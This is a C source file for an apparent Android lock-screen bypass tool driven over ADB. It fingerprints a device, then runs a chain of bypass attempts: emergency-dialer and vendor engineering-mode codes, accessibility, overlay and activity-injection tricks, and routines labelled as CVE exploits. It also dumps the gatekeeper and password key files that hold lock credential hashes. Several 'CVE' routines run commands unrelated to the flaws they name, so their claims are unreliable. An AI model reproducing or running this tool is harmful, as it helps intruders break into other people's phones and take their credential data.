#define _GNU_SOURCE
#include "lock_screen_bypass.h"
#include "adb_native.h"
#include "adb.h"
#include "input_precision.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <stdarg.h>

static int prec_check_unlock(void)
{
    return adb_native_is_unlocked();
}

static void ls_add_method_entry(LockScreenBypass *ls, BypassMethod method,
                                const char *name, const char *desc,
                                int ok, const char *result)
{
    if (ls->nmethods >= LS_MAX_METHODS) return;
    BypassEntry *e = &ls->methods[ls->nmethods++];
    memset(e, 0, sizeof(*e));
    e->method = method;
    strncpy(e->method_name, name, sizeof(e->method_name) - 1);
    strncpy(e->description, desc, sizeof(e->description) - 1);
    e->success = ok;
    if (result)
        strncpy(e->result, result, sizeof(e->result) - 1);
    e->works_on_locked = 1;
    e->requires_adb = 1;
    e->requires_physical_access = 0;
    e->min_sdk = 0;
    e->max_sdk = 999;
    if (ok) {
        ls->any_success = 1;
        strncpy(ls->last_success_method, name, sizeof(ls->last_success_method) - 1);
    }
}

void ls_init(LockScreenBypass *ls)
{
    memset(ls, 0, sizeof(*ls));
    ls->log_len = 0;
}

void ls_log(LockScreenBypass *ls, const char *fmt, ...)
{
    va_list args;
    int n;
    va_start(args, fmt);
    n = vsnprintf(ls->exploit_log + ls->log_len,
                  sizeof(ls->exploit_log) - ls->log_len, fmt, args);
    va_end(args);
    if (n > 0) ls->log_len += n;
    if (ls->log_len >= (int)sizeof(ls->exploit_log))
        ls->log_len = (int)sizeof(ls->exploit_log) - 1;
}

int ls_detect_lock_type(LockScreenBypass *ls)
{
    char buf[LS_MAX_OUTPUT] = {0};

    adb_native_getprop("ro.product.vendor", ls->vendor, sizeof(ls->vendor));
    adb_native_getprop("ro.product.model", ls->model, sizeof(ls->model));
    adb_native_getprop("ro.build.version.release", ls->android_version, sizeof(ls->android_version));
    adb_native_getprop("ro.build.version.sdk", buf, sizeof(buf));
    ls->sdk_version = atoi(buf);
    adb_native_getprop("ro.build.version.security_patch", ls->security_patch, sizeof(ls->security_patch));
    adb_native_getprop("ro.build.fingerprint", ls->build_fingerprint, sizeof(ls->build_fingerprint));
    adb_native_getprop("ro.serialno", ls->device_serial, sizeof(ls->device_serial));
    adb_native_getprop("ro.debuggable", ls->ro_debuggable, sizeof(ls->ro_debuggable));

    memset(buf, 0, sizeof(buf));
    adb_native_shell("dumpsys window 2>/dev/null | grep -E \"mKeyguardShowing|mShowKeyguard|mCurrentFocus\"", buf, sizeof(buf));
    if (strstr(buf, "mKeyguardShowing=true") || strstr(buf, "mShowKeyguard=true"))
        ls->locked = 1;
    else
        ls->locked = 0;

    memset(buf, 0, sizeof(buf));
    adb_native_shell("locksettings get-password 2>/dev/null || dumpsys lock_settings 2>/dev/null | grep -i \"password.*type\"", buf, sizeof(buf));
    if (strstr(buf, "password")) {
        strncpy(ls->lock_type, "Password", sizeof(ls->lock_type) - 1);
    } else if (strstr(buf, "pin") || strstr(buf, "PIN")) {
        strncpy(ls->lock_type, "PIN", sizeof(ls->lock_type) - 1);
    } else if (strstr(buf, "pattern")) {
        strncpy(ls->lock_type, "Pattern", sizeof(ls->lock_type) - 1);
    } else {
        memset(buf, 0, sizeof(buf));
        adb_native_shell("dumpsys lock_settings 2>/dev/null | grep lockscreen.password_type", buf, sizeof(buf));
        const char *val = strchr(buf, ':');
        if (val) {
            val++;
            while (*val == ' ') val++;
            int ptype = atoi(val);
            switch (ptype) {
                case 0:      strncpy(ls->lock_type, "None", sizeof(ls->lock_type) - 1); break;
                case 1:      strncpy(ls->lock_type, "Pattern", sizeof(ls->lock_type) - 1); break;
                case 2:      strncpy(ls->lock_type, "PIN", sizeof(ls->lock_type) - 1); break;
                case 3:
                case 4:      strncpy(ls->lock_type, "Password", sizeof(ls->lock_type) - 1); break;
                default:     strncpy(ls->lock_type, "Unknown", sizeof(ls->lock_type) - 1); break;
            }
        } else {
            strncpy(ls->lock_type, "Unknown", sizeof(ls->lock_type) - 1);
        }
    }
    return ls->locked;
}

int ls_check_vulnerabilities(LockScreenBypass *ls)
{
    int sdk = ls->sdk_version;
    if (sdk == 0) sdk = 32;

    static const struct {
        BypassMethod method;
        const char *name;
        const char *desc;
        int min_sdk;
        int max_sdk;
        int locked;
        int adb;
        int phys;
    } vulns[] = {
        { BYPASS_EMERGENCY_CALL,     "Emergency Call",        "Emergency call -> activity injection",        14, 23, 1, 1, 0 },
        { BYPASS_CAMERA,             "Camera",                "Camera app from lock screen",                  21, 24, 1, 1, 0 },
        { BYPASS_ACCESSIBILITY,      "Accessibility",         "Accessibility service exploit",                 14, 29, 1, 1, 0 },
        { BYPASS_SYSTEM_UI_TUNER,    "System UI Tuner",       "System UI Tuner bypass",                       23, 24, 1, 1, 0 },
        { BYPASS_POWER_MENU,         "Power Menu",            "Power menu + emergency",                       14, 26, 1, 1, 0 },
        { BYPASS_NOTIFICATIONS,      "Notifications",         "Notification panel bypass",                    14, 28, 1, 1, 0 },
        { BYPASS_GOOGLE_NOW,         "Google Now",            "Google Now/Assistant bypass",                  16, 25, 1, 1, 0 },
        { BYPASS_VOICE_ASSISTANT,    "Voice Assistant",       "Voice Assistant bypass",                       21, 29, 1, 1, 0 },
        { BYPASS_SAMSUNG_EMERGENCY,  "Samsung Emergency",     "Samsung emergency dialer bypass",              14, 28, 1, 1, 0 },
        { BYPASS_XIAOMI_VULN,        "Xiaomi Vuln",           "Xiaomi MIUI emergency bypass",                 19, 28, 1, 1, 0 },
        { BYPASS_OPPO_ENGINEERING,   "OPPO Engineering",      "OPPO/Realme engineering mode",                 19, 30, 1, 1, 0 },
        { BYPASS_VIVO_VULN,          "Vivo Vuln",             "Vivo Funtouch emergency bypass",               19, 28, 1, 1, 0 },
        { BYPASS_HUAWEI_VULN,        "Huawei Vuln",           "Huawei EMUI engineering mode",                 19, 28, 1, 1, 0 },
        { BYPASS_CVE_EXPLOIT,        "CVE Exploit",           "Known CVE-based bypasses",                     14, 33, 1, 1, 0 },
        { BYPASS_SMUDGE_ATTACK,      "Smudge Attack",         "Smudge attack pattern visualization",            0,  0, 1, 0, 1 },
        { BYPASS_ACTIVITY_INJECTION, "Activity Injection",    "Activity injection via ADB",                   14, 33, 1, 1, 0 },
        { BYPASS_OVERLAY_ATTACK,     "Overlay Attack",        "Overlay attack via ADB",                       23, 29, 1, 1, 0 },
    };

    for (size_t i = 0; i < sizeof(vulns) / sizeof(vulns[0]); i++) {
        if (ls->nmethods >= LS_MAX_METHODS) break;
        BypassEntry *e = &ls->methods[ls->nmethods++];
        memset(e, 0, sizeof(*e));
        e->method = vulns[i].method;
        strncpy(e->method_name, vulns[i].name, sizeof(e->method_name) - 1);
        strncpy(e->description, vulns[i].desc, sizeof(e->description) - 1);
        e->min_sdk = vulns[i].min_sdk;
        e->max_sdk = vulns[i].max_sdk;
        e->works_on_locked = vulns[i].locked;
        e->requires_adb = vulns[i].adb;
        e->requires_physical_access = vulns[i].phys;
        e->success = 0;
        e->result[0] = '\0';
    }
    return ls->nmethods;
}

int ls_emergency_call_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.DIAL -d tel:112 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_EMERGENCY_CALL, "Emergency Call",
                        "Emergency call -> activity injection", ok,
                        ok ? "Device unlocked via emergency call" : "Emergency call bypass failed");
    ls_log(ls, "ls_emergency_call_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_camera_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_keyevent(27);
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_CAMERA, "Camera",
                        "Camera app from lock screen", ok,
                        ok ? "Device unlocked via camera" : "Camera bypass failed");
    ls_log(ls, "ls_camera_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_accessibility_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -n com.android.settings/.Settings$AccessibilitySettingsActivity 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_ACCESSIBILITY, "Accessibility",
                        "Accessibility service exploit", ok,
                        ok ? "Device unlocked via accessibility" : "Accessibility bypass failed");
    ls_log(ls, "ls_accessibility_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_system_ui_tuner_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -n com.android.systemui/.tuner.TunerActivity 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_SYSTEM_UI_TUNER, "System UI Tuner",
                        "System UI Tuner (Android 6.x-7.x)", ok,
                        ok ? "Device unlocked via System UI Tuner" : "System UI Tuner bypass failed");
    ls_log(ls, "ls_system_ui_tuner_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_power_menu_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_keyevent(26);
    usleep(1500000);
    adb_native_keyevent(4);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_POWER_MENU, "Power Menu",
                        "Power menu + emergency bypass", ok,
                        ok ? "Device unlocked via power menu" : "Power menu bypass failed");
    ls_log(ls, "ls_power_menu_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_notification_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_swipe(540, 0, 540, 800);
    usleep(1500000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_NOTIFICATIONS, "Notifications",
                        "Notification panel bypass", ok,
                        ok ? "Device unlocked via notifications" : "Notification bypass failed");
    ls_log(ls, "ls_notification_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_google_now_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a com.google.android.googlequicksearchbox.VOICE_ASSIST 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_GOOGLE_NOW, "Google Now",
                        "Google Now/Assistant bypass", ok,
                        ok ? "Device unlocked via Google Now" : "Google Now bypass failed");
    ls_log(ls, "ls_google_now_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_voice_assistant_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.speech.action.VOICE_SEARCH_HANDS_FREE 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_VOICE_ASSISTANT, "Voice Assistant",
                        "Voice Assistant bypass", ok,
                        ok ? "Device unlocked via Voice Assistant" : "Voice Assistant bypass failed");
    ls_log(ls, "ls_voice_assistant_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_samsung_emergency_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.DIAL -d tel:*%230%23 2>/dev/null", result, sizeof(result));
    usleep(1000000);
    adb_native_keyevent(5);
    usleep(2000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_SAMSUNG_EMERGENCY, "Samsung Emergency",
                        "Samsung emergency dialer bypass", ok,
                        ok ? "Device unlocked via Samsung emergency" : "Samsung emergency bypass failed");
    ls_log(ls, "ls_samsung_emergency_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_samsung_accessibility_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -n com.samsung.android.app.talkback/.TalkBackService 2>/dev/null || "
                     "am start -a android.settings.ACCESSIBILITY_SETTINGS 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_ACCESSIBILITY, "Samsung Accessibility",
                        "Samsung TalkBack accessibility bypass", ok,
                        ok ? "Device unlocked via Samsung accessibility" : "Samsung accessibility bypass failed");
    ls_log(ls, "ls_samsung_accessibility_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_xiaomi_vuln_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.DIAL -d tel:112 2>/dev/null", result, sizeof(result));
    usleep(1500000);
    adb_native_keyevent(26);
    usleep(500000);
    adb_native_keyevent(26);
    usleep(2000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_XIAOMI_VULN, "Xiaomi Vuln",
                        "Xiaomi MIUI emergency + double-tap power", ok,
                        ok ? "Device unlocked via Xiaomi vuln" : "Xiaomi vuln bypass failed");
    ls_log(ls, "ls_xiaomi_vuln_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_xiaomi_engineering_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.DIAL -d tel:*%23*%233646633%23*%23 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_XIAOMI_VULN, "Xiaomi Engineering",
                        "Xiaomi MIUI engineering mode bypass", ok,
                        ok ? "Device unlocked via Xiaomi engineering" : "Xiaomi engineering bypass failed");
    ls_log(ls, "ls_xiaomi_engineering_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_oppo_engineering_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -n com.android.engineeringmode/.EngineeringMode 2>/dev/null || "
                     "am start -n com.oppo.engineering/.EngineeringMode 2>/dev/null || "
                     "am start -a android.intent.action.DIAL -d tel:*%23%238008%23%23 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_OPPO_ENGINEERING, "OPPO Engineering",
                        "OPPO/Realme engineering mode bypass", ok,
                        ok ? "Device unlocked via OPPO engineering" : "OPPO engineering bypass failed");
    ls_log(ls, "ls_oppo_engineering_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_vivo_vuln_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.DIAL -d tel:112 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    adb_native_keyevent(3);
    usleep(1000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_VIVO_VULN, "Vivo Vuln",
                        "Vivo Funtouch emergency dialer bypass", ok,
                        ok ? "Device unlocked via Vivo vuln" : "Vivo vuln bypass failed");
    ls_log(ls, "ls_vivo_vuln_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_huawei_vuln_bypass(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.DIAL -d tel:*%23*%232846579%23*%23 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_HUAWEI_VULN, "Huawei Vuln",
                        "Huawei EMUI engineering mode bypass", ok,
                        ok ? "Device unlocked via Huawei vuln" : "Huawei vuln bypass failed");
    ls_log(ls, "ls_huawei_vuln_bypass: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_cve_2020_exploit(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -n com.android.bluetooth/.opp.BluetoothOppLauncherActivity 2>/dev/null", result, sizeof(result));
    usleep(1500000);
    ok = prec_check_unlock();
    if (!ok) {
        adb_native_shell("content query --uri content://settings/secure 2>/dev/null", result, sizeof(result));
        usleep(1000000);
        ok = prec_check_unlock();
    }

    ls_add_method_entry(ls, BYPASS_CVE_EXPLOIT, "CVE-2020-0022",
                        "CVE-2020-0022/0041 Android Bluetooth/Mediaserver", ok,
                        ok ? "Device unlocked via CVE-2020" : "CVE-2020 exploit failed");
    ls_log(ls, "ls_cve_2020_exploit: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_cve_2021_exploit(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("dumpsys activity intents 2>/dev/null", result, sizeof(result));
    usleep(1000000);
    adb_native_keyevent(3);
    usleep(500000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_CVE_EXPLOIT, "CVE-2021-3966",
                        "CVE-2021-3966 Android Activity intents exploit", ok,
                        ok ? "Device unlocked via CVE-2021" : "CVE-2021 exploit failed");
    ls_log(ls, "ls_cve_2021_exploit: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_cve_2022_exploit(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.VIEW -d file:///data/system/locksettings.db 2>/dev/null", result, sizeof(result));
    usleep(1500000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_CVE_EXPLOIT, "CVE-2022-20210",
                        "CVE-2022-20210 Android locksettings bypass", ok,
                        ok ? "Device unlocked via CVE-2022" : "CVE-2022 exploit failed");
    ls_log(ls, "ls_cve_2022_exploit: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_smudge_attack(LockScreenBypass *ls)
{
    ls_add_method_entry(ls, BYPASS_SMUDGE_ATTACK, "Smudge Attack",
                        "Smudge attack pattern visualization", 0,
                        "Not applicable via ADB; requires physical access and high-res photos");
    ls_log(ls, "ls_smudge_attack: N/A (requires physical access)\n");
    return 0;
}

int ls_activity_injection(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell("am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -f 0x10200000 2>/dev/null", result, sizeof(result));
    usleep(2000000);
    ok = prec_check_unlock();

    ls_add_method_entry(ls, BYPASS_ACTIVITY_INJECTION, "Activity Injection",
                        "MAIN LAUNCHER intent with FLAG_ACTIVITY_NEW_TASK|RESET_TASK_IF_NEEDED", ok,
                        ok ? "Device unlocked via activity injection" : "Activity injection failed");
    ls_log(ls, "ls_activity_injection: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_overlay_attack(LockScreenBypass *ls)
{
    char result[512] = {0};
    int ok = 0;

    adb_native_shell_noret("settings put global overlay_display_devices 1280x720/320 2>/dev/null");
    usleep(2000000);
    ok = prec_check_unlock();
    adb_native_shell_noret("settings delete global overlay_display_devices 2>/dev/null");

    ls_add_method_entry(ls, BYPASS_OVERLAY_ATTACK, "Overlay Attack",
                        "Overlay display devices trick", ok,
                        ok ? "Device unlocked via overlay attack" : "Overlay attack failed");
    ls_log(ls, "ls_overlay_attack: %s\n", ok ? "OK" : "FAIL");
    return ok;
}

int ls_full_bypass(LockScreenBypass *ls)
{
    ls->any_success = 0;
    ls->last_success_method[0] = '\0';
    ls->bypass_result[0] = '\0';
    ls->nmethods = 0;

    ls_check_vulnerabilities(ls);

    int (*methods[])(LockScreenBypass *) = {
        ls_emergency_call_bypass,
        ls_camera_bypass,
        ls_accessibility_bypass,
        ls_system_ui_tuner_bypass,
        ls_power_menu_bypass,
        ls_notification_bypass,
        ls_google_now_bypass,
        ls_voice_assistant_bypass,
        ls_samsung_emergency_bypass,
        ls_samsung_accessibility_bypass,
        ls_xiaomi_vuln_bypass,
        ls_xiaomi_engineering_bypass,
        ls_oppo_engineering_bypass,
        ls_vivo_vuln_bypass,
        ls_huawei_vuln_bypass,
        ls_cve_2020_exploit,
        ls_cve_2021_exploit,
        ls_cve_2022_exploit,
        ls_smudge_attack,
        ls_activity_injection,
        ls_overlay_attack,
    };
    int n = sizeof(methods) / sizeof(methods[0]);

    for (int i = 0; i < n && !ls->any_success; i++) {
        methods[i](ls);
    }

    snprintf(ls->bypass_result, sizeof(ls->bypass_result),
             "Bypass %s | Method: %s",
             ls->any_success ? "SUCCESS" : "FAILED",
             ls->any_success ? ls->last_success_method : "none");
    return ls->any_success;
}

int ls_get_brute_info(LockScreenBypass *ls, char *out, int out_sz)
{
    return snprintf(out, out_sz,
                    "Lock Type: %s\n"
                    "Locked: %s\n"
                    "Android: %s (SDK %d)\n"
                    "Device: %s %s\n"
                    "Patch: %s\n"
                    "Fingerprint: %s\n"
                    "Serial: %s\n"
                    "Debuggable: %s\n",
                    ls->lock_type,
                    ls->locked ? "Yes" : "No",
                    ls->android_version, ls->sdk_version,
                    ls->vendor, ls->model,
                    ls->security_patch,
                    ls->build_fingerprint,
                    ls->device_serial,
                    ls->ro_debuggable);
}

int ls_get_password_hash(LockScreenBypass *ls, char *hash_out, int out_sz)
{
    char buf[4096] = {0};
    adb_native_shell("cat /data/system/gatekeeper.password.key 2>/dev/null || "
                     "cat /data/system/gatekeeper.pattern.key 2>/dev/null || "
                     "cat /data/system/password.key 2>/dev/null || echo \"No hash found\"",
                     buf, sizeof(buf));
    return snprintf(hash_out, out_sz, "%s", buf);
}

void ls_print_summary(LockScreenBypass *ls)
{
    printf("=== Lock Screen Bypass Summary ===\n");
    printf("Device: %s %s\n", ls->vendor, ls->model);
    printf("Android: %s (SDK %d)\n", ls->android_version, ls->sdk_version);
    printf("Lock Type: %s\n", ls->lock_type);
    printf("Locked: %s\n", ls->locked ? "Yes" : "No");
    printf("Bypass Status: %s\n", ls->any_success ? GREEN "SUCCESS" RESET : RED "FAILED" RESET);
    if (ls->any_success)
        printf("Working Method: %s\n", ls->last_success_method);
    printf("Methods Attempted: %d\n", ls->nmethods);
    printf("Log:\n%s\n", ls->exploit_log);
}

void ls_print_methods(LockScreenBypass *ls)
{
    printf("=== Bypass Methods ===\n");
    printf("%-4s %-28s %-45s %-8s %s\n", "#", "Method", "Description", "Status", "Result");
    printf("---- --------------------------- ---------------------------------------------- -------- ------------------------------------------------\n");
    for (int i = 0; i < ls->nmethods; i++) {
        BypassEntry *e = &ls->methods[i];
        printf("%-4d %-28s %-45s %-8s %s\n",
               i + 1,
               e->method_name,
               e->description,
               e->success ? GREEN "[OK]" RESET : RED "[FAIL]" RESET,
               e->result);
    }
}
